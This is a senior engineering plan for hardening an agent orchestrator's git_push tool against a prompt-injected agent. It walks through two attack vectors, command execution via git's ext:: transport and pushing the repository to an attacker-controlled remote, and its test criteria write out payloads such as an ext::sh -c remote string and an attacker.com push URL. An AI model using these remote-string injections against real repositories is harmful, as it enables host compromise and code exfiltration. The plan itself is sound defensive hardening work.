# P6.5 — senior plan (git_push remote hardening: transport allowlist + configured-remote restriction)

## 1. Context

P6.5 is the ratified survivor of a 6-item verify-first hygiene grab-bag (`docs/process/architect-briefs/P6.5.md`); the architect dropped 5 and kept **G1 only**, the one real bug. `_make_git_push` (`src/orchestrator/tools/subprocess_tools.py:362-447`) is the most-irreversible tool in the system (`tools.yaml` rev 1, HARD on every shipped agent config). It already rejects flag-shaped values (`:406-415`) and 5 destructive flags (`:417-422`) and builds a fixed `argv` with no shell (`:425`). **Two real gaps remain, both reachable by a prompt-injected agent** (the project's central threat model — cf. P6.1 Bug B):

- **2a — transport RCE.** No `GIT_ALLOW_PROTOCOL` is set on any git invocation in this module (env passthrough is `{"SSH_AUTH_SOCK"}` only, `:52/:428-430`). So `remote = "ext::sh -c '<cmd>'"` passes every current check and, on the non-sandboxed path (`posture_resolver is None` → `_dispatch`, `:443`), `git push ext::… branch` executes `<cmd>` via git's `ext` transport → host RCE.
- **2b — repo exfil to an attacker host.** The tool accepts **inline-URL remotes** (`_resolve_git_remote_host`, `:450-492`, deliberately parses `https://` / `git@host:` / `ssh://`). So `remote = "https://attacker.com/r.git"` is honored; on the sandboxed path the egress is then *pinned to attacker.com* (the resolver hands the attacker's host to the egress allowlist), so the push **exfiltrates the repo even inside the sandbox**.

This is the deferred tightening ADR-036 D3-iii already named: line 75 records the exfil-by-remote residual and states *"A named-remote / operator-remote-allowlist … is the deferred opt-in tightening."* **G1 ships exactly that** plus the transport allowlist that robustly kills 2a. Both are input-validation / transport hardening — **no isolation-contract change (ADR-037 D2 untouched)** — so routine per the architect's rule; `plan_has_adr=false`, the ADR-036 note is a residual-status annotation, not an amendment, no Accept gate. `requires_cross_family_review=true` is pre-set and well-aimed: this is a subprocess-injection surface, the same lens that caught P6.1 Bug B → **full impl-stage dual-lens (R0-A + R0-B)**.

**Interpretation I'm locking (push back if wrong):** "restrict remote to a configured remote name" = the param must name a remote present in `git remote` output; inline URLs/paths are rejected. This *narrows the tool's accepted input* (inline remotes were previously intended) — the architect ratified this narrowing explicitly (brief Ratification line 110). See §5 for one realization sub-choice (the `file` transport) that I resolved and am surfacing.

## 2. Tasks

### P6.5-G1 — git_push transport allowlist + configured-remote restriction

- **What:** Harden `_make_git_push` so (a) every git subprocess it launches runs with `GIT_ALLOW_PROTOCOL` set to a safe transport allowlist (git itself refuses `ext::`/`fd::` regardless of the remote string), and (b) the `remote` param is restricted to a **configured remote name** (resolved from `git remote`); anything not in that list — inline URLs, paths, `ext::…` strings — is rejected with `LocalToolError` **before** any push runs. One atomic change = one commit.

- **Where:** `src/orchestrator/tools/subprocess_tools.py`
  - New module constant near `_GIT_PUSH_ENV_PASSTHROUGH` (`:52`), e.g. `_GIT_ALLOW_PROTOCOL = "https:ssh:git:file"` (the safe set; see §5 for the `file` rationale).
  - `_make_git_push._impl` (`:381-445`): after computing `remote` (`:384`) and the existing flag-shape/banned-flag checks (`:406-422`), add a **configured-remote-name check** that runs on BOTH paths (place it before the `if posture_resolver is not None:` branch at `:432`, so it guards the non-sandbox `_dispatch` RCE path too): list configured remotes via `git remote` (a fixed-argv `run_scoped_command` with `scoped_env`, GIT_ALLOW_PROTOCOL overlaid, short timeout, like the HEAD-resolve at `:390-398`); if `remote` is not in that set, `raise LocalToolError("git_push: remote {remote!r} is not a configured remote; …")`.
  - Add `GIT_ALLOW_PROTOCOL` to the push subprocess env: include it in the `extra_env` dict (`:428-430`) so it flows through both `_dispatch` (`:443`) and `_sandbox_dispatch` (`:436`) via `scoped_env`'s overlay.
  - Add `GIT_ALLOW_PROTOCOL` to every other git invocation in the module: the HEAD `git rev-parse` resolve (`:390-398`), the new `git remote` list call, and the `git remote get-url` resolve in `_resolve_git_remote_host` (`:457-463`). (Mechanism is junior's choice — e.g. a tiny `scoped_env(extra_env={"GIT_ALLOW_PROTOCOL": _GIT_ALLOW_PROTOCOL})` helper. Outcome: no git subprocess in this module runs without it.)
  - `_resolve_git_remote_host` (`:450-492`) keeps its URL-parsing logic unchanged — after the restriction it is only ever called with a configured name, so `git remote get-url <name>` returns the *operator-configured* URL; the parse branches now operate on trusted input. Only its env gains GIT_ALLOW_PROTOCOL.

- **Why:** ADR-036 D3-iii (the governing decision for git_push); closes the two named-but-unbounded vectors — 2a (no transport allowlist) and 2b (inline-URL remotes = the D3-iii line-75 exfil-by-remote residual, whose deferred "named-remote allowlist" tightening this realizes). Brief §② + Ratification lines 108-111.

- **Acceptance criteria** (junior is done when all hold; `tests/tools/test_subprocess_tools.py`):
  1. **Input-restriction fail-on-revert (2a + 2b via param):** new tests — `_invoke("git_push", repo, {"remote": "ext::sh -c 'touch PWNED'", "branch": "main"})` raises `LocalToolError` **and** no `PWNED` file is created; `{"remote": "https://evil/r", "branch": "main"}` raises `LocalToolError` (not a configured remote). (Use a repo with a configured `origin` so the rejection is provably the name-check, not "no remotes at all".)
  2. **Transport defense-in-depth (2a independent of the name-check):** new test — configure a remote whose URL is `ext::sh -c 'touch PWNED'` (`git remote add evil "ext::…"`), then `_invoke("git_push", repo, {"remote": "evil", "branch": "main"})`; assert **no `PWNED` file is created** (git refuses the `ext` protocol under `GIT_ALLOW_PROTOCOL`). The call returns a non-zero-exit `TOOL_RESULT` (git protocol-denied), which is expected — the security property under test is "no command executed."
  3. **Happy path still works:** `remote="origin"` where `origin` is a configured remote → push succeeds (`exit_code=0` in content). **This requires updating the existing `test_git_push_happy_path_local_remote` (`:333-360`)** — it currently passes the bare-repo *path* inline as `remote=str(bare)`, which the restriction now rejects; change it to `git remote add origin <bare>` (in `src`) then `{"remote": "origin", "branch": "main"}`.
  4. **GIT_ALLOW_PROTOCOL present in env:** a test (mirroring `test_git_push_ssh_auth_sock_overlaid_when_present`, `:363`) asserting the push subprocess env contains `GIT_ALLOW_PROTOCOL == _GIT_ALLOW_PROTOCOL`.
  5. **Caller-side test fixups (promotion-impact):** `test_git_push_ssh_auth_sock_overlaid_when_present` (`:363`) and `test_git_push_ssh_auth_sock_absent_no_key` (`:404`) both monkeypatch `run_scoped_command` with a `_fake_run` returning `output="pushed"`. The new `git remote` list call goes through the same mock → would parse `"pushed"` as the only remote and reject `remote="origin"`. Make `_fake_run` argv-aware: when invoked for `["git", "remote", …]` return `output="origin\n"`; otherwise keep `"pushed"`. (Without this both tests break.)
  6. **Constitution gates green for free:** `t9` (`test_t9_no_shell_in_subprocess_surface`, `tests/tools/test_constitution.py`) stays green — all new git calls are fixed-argv, no shell; `t12` (git_push banned-flags) unaffected. No new `LLMPurpose` (t3 free — `tools/` covered). State the no-new-LLMPurpose explicitly in the commit body.
  7. Full gate green: `ruff` + `mypy` + `pytest` (incl. `tests/tools/test_subprocess_tools.py` + `tests/tools/test_constitution.py`).

- **Out of scope:** real-credential / PAT push (still deferred per D3-iii); any change to `_resolve_git_remote_host`'s URL-parsing logic beyond the env overlay; the ADR-037 D2 isolation contract / egress sandbox (untouched); the other 5 dropped grab-bag items (IPv6, session disabled-recheck, eff_auto clamp, docker.sock substring, docstrings) — all DROPPED, do not touch.

## 5. Where you'd push back

**(a) Resolved realization choice I'm surfacing — `file` in the transport allowlist.** The brief's safe set was illustrative (`如 https:ssh:git`). `GIT_ALLOW_PROTOCOL` is a strict allowlist: protocols *not* listed are denied, including `file`. The only feasible "push works" unit test (criterion 3) pushes to a **local bare repo over the `file` transport**; with `https:ssh:git` only, that test cannot pass. I therefore specify **`https:ssh:git:file`**. Security rationale this is safe: (i) `file` is not an RCE vector — only `ext`/`fd` are, and both stay denied; (ii) once `remote` is restricted to configured names, an attacker cannot inject a `file` target — configured remotes are operator-controlled. So `file` is admitted for legitimate local mirrors + the test, with no reopening of 2a/2b. **If you want the strict `https:ssh:git` instead, say so** — then criterion 3 must drop the local-repo happy path and prove "works" only via a mocked `run_scoped_command` (weaker — no real transport exercised). I lean keep `file`.

**(b) Verify-cited pre-investigation (claims-with-cites, discipline (a)/(b)).** I confirmed by reading the current test file, not inference: the configured-remote restriction has **promotion-impact on 3 existing tests**, all captured in criteria 3 & 5 — `test_git_push_happy_path_local_remote` (`:333-360`, inline `remote=str(bare)`) and the two ssh_auth_sock tests (`:363`, `:404`, whose `_fake_run` returns `"pushed"` for *all* argv incl. the new `git remote` list call). Without these fixups the change red-fails its own suite. No other caller passes an inline remote (the registry builder + tools.yaml only register the tool; agent tool-calls supply `remote` at runtime via the gate→confirm path — exactly the input being narrowed).

**(c) No design decision is open.** Both fixes are input-validation/transport hardening on an existing tool; no new ADR, no spine touch (gate/`decide_tier`/`_execute_local_call` not on this path), no new `LLMPurpose`. The ADR-036 touch is a residual-status annotation the D3-iii residual already anticipated. If the architect disagrees that the `file`-allowlist call (a) is mine to make, that is the one item to route before junior dispatch; otherwise this is ready for direct junior dispatch (no ADR Accept gate).
